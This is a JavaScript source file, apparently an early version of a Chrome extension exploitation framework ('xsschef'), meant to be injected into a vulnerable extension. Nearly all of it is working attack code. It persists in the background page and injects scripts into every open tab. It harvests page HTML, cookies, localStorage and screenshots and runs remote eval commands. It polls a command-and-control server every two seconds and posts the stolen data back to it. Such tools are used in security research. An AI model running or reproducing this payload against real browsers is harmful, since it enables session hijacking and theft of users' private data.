/**
 * @author Krzysztof Kotowicz
 *
 */
function __xsschef() {
    // start scripts
    // this script gets executed in sheepchannel tab context, it's written here only for syntax highlighting & easy editing
    var sheepchannel_script = function(msg) {
        switch (msg.cmd) {
            case 'sendhtml':
                __p.postMessage({cmd:'recvstuff', p: {'html':document.documentElement.innerHTML}});
            break;
            case 'sendinfo':
                __p.postMessage({cmd:'recvstuff', p: {'cookies':document.cookie, 'localStorage': localStorage}});
            break;
            case 'eval':
                __p.postMessage({cmd:'recveval', p: eval(msg.p)});
            break;
        }
    }
    
    var backchannel_script = function(msg) {
        switch (msg.cmd) {
            case 'log':
                var x = new XMLHttpRequest();
                x.open('POST', 'http://dev.localhost/xsschef/server.php?ch=xxx', true);
                x.send(JSON.stringify(msg.p));
            break;
        }
    }

    // polling for more commands from c&c server - from page for now
    var poller_script = function() {
        setInterval(function() {
            //console.log('polling for cmds');
            var x = new XMLHttpRequest();
            x.open('GET', 'http://dev.localhost/xsschef/server.php?ch=xxx-cmd', true);
            x.onreadystatechange = function () {
              if (x.readyState == 4 && x.status == 200) {
                try {
                    var cmds = JSON.parse(x.responseText);
                    for (var i = 0; i < cmds.length; i++) {
                        // forward command to extension
                        __p.postMessage(cmds[i]);
                    }
                } catch(e) {}
              }
            };
            x.send(null); 
        }, 2000);
    }
    
    // end scripts
    
    
    chrome.permissions.contains({
      origins: ['http://*/*']
    }, function(result) {
        console.log(result,this);
        if (result) {
            // extension has permissions for XHR on our C&C domain
            // and set a direct log function
        } else {
            // proxy the requests to C&C through backchannel tab
        }
    });

    
    var nolog = function() {};
    var log = nolog;
    var backchannel;
    var sheeps = {};
    
    var log_to_console = function() {
        log = function() {
            console.log(arguments);
        }
        init_complete();
    }
    
    chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
        if (changeInfo.status == 'complete') {
            addSheep(tab);
    
            if (backchannel && backchannel.tab.id == tabId) {
                // backchannel changed, re-establish
                setupBackchannel(tabId, report_tabs);
            } else {
                report_tabs();
            }
        }
    });
    
    chrome.tabs.onRemoved.addListener(function(tabId, changeInfo) {
        delete sheeps[tabId];
        if (backchannel && backchannel.tab.id == tabId) {
            // backchannel removed, re-establish
            chrome.tabs.getSelected(null, function(t) {
                setupBackchannel(t.id, report_tabs);
            });
        } else {
            report_tabs();
        }
    });
        
    var addSheep = function(tab) {
        sheeps[tab.id] = tab;

        try {
            chrome.tabs.executeScript(tab.id, 
                {'code': '(function(){var __p=chrome.extension.connect({name:"sheepchannel"});__p.onMessage.addListener('+sheepchannel_script.toString()+');})();'}
            );
        } catch(e) {
            delete sheeps[tab.id];
        }    
    }
    

    // setup listener from sheeps
    chrome.extension.onConnect.addListener(function(port) {
        if (port.name == 'backchannel') {
            backchannel = port;
        } else if (port.name == 'sheepchannel') {
            sheeps[port.tab.id].port = port;
        }
        
        port.onMessage.addListener(function(msg) {
            switch (msg.cmd) {
                case 'recvstuff':
                case 'recveval':
                    log({type: msg.cmd, id:port.tab.id, url:port.tab.url, result: msg.p});
                break;
                case 'eval':
                    if (msg.id) { // eval in sheep
                        log('eval ' + msg.p + ' in sheep');
                        postToSheep(msg.id, {p: msg.p, cmd: 'eval'});
                    } else { // eval in extension
                        log({type: 'recveval',result: eval(msg.p)});
                    }
                break;
                case 'ping':
                    log({type: 'pong', id: port.tab.id, url: port.tab.url});
                break;
                case 'screenshot':
                    chrome.tabs.captureVisibleTab(null,null, function(data_url) {
                        log({type:'recvscreenshot', url: data_url});
                    });
                break;
                case 'report':
                    report_tabs();
                    report_page_info();
                    report_ext();
                break;
                case 'reporthtml':
                        postToSheep(msg.id, {cmd: 'sendhtml'});
                break;
            }
        });
    });
    
    // setup sheepchannel scripts in all tabs (sheeps)
    chrome.tabs.query({}, function(t2) {
        for (var i=0; i<t2.length;i++) {
            addSheep(t2[i]);
        }
    });    

    var setupBackchannel = function(tabId, oncomplete) {
        chrome.tabs.executeScript(tabId, 
            {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});__p.onMessage.addListener('+backchannel_script.toString()+');('+poller_script.toString()+')()})();'}
                ,function() {setTimeout(oncomplete, 500)});
    }
    
    // setup backchannel port
    chrome.tabs.getSelected(null, function(t) {
        setupBackchannel(t.id, init_complete);
    });
    
    
    var log_to_backchannel = function() {
        log = function() {
            if (backchannel) {
                backchannel.postMessage({'cmd':'log', 'p': [].slice.call(arguments)});
            }
        }
    }
    
    log_to_backchannel();
    
    var report_tabs = function() {
        log('reporting tabs');
        chrome.tabs.query({}, function(t) {
            log({type: 'report_tabs','result':t});
        });
    }
    
    var postToSheeps = function(msg) {
        for (var i in sheeps) {
            postToSheep(i,msg);
        }
    }
    
    var postToSheep = function(i,msg) {
        if (sheeps[i].port) {
            sheeps[i].port.postMessage(msg);
        }
    }
    
    var report_page_info = function() {
        postToSheeps({'cmd':'sendinfo'});
    }

    var report_ext = function() {
        log('reporting ext info'); // autopwn
        log({type:'report_ext',result:{'extension': location.href, 'html':document.documentElement.innerHTML,'cookies':document.cookie, 'localStorage': localStorage}});
    }
    
    var init_complete = function() { // framework ready
        if (window === chrome.extension.getBackgroundPage()) {
            log('persisted in background page :)');
        } else {
            log('no persistence :/');
        }
        log('foothold started');
        report_tabs();
        report_ext();
    }
};

if (chrome.extension.getBackgroundPage()) {// try to persist in background page
    // chrome 18 csp fix - maybe add script to document.body? 
    chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
} else {
    __xsschef(); // no persistence :(
}
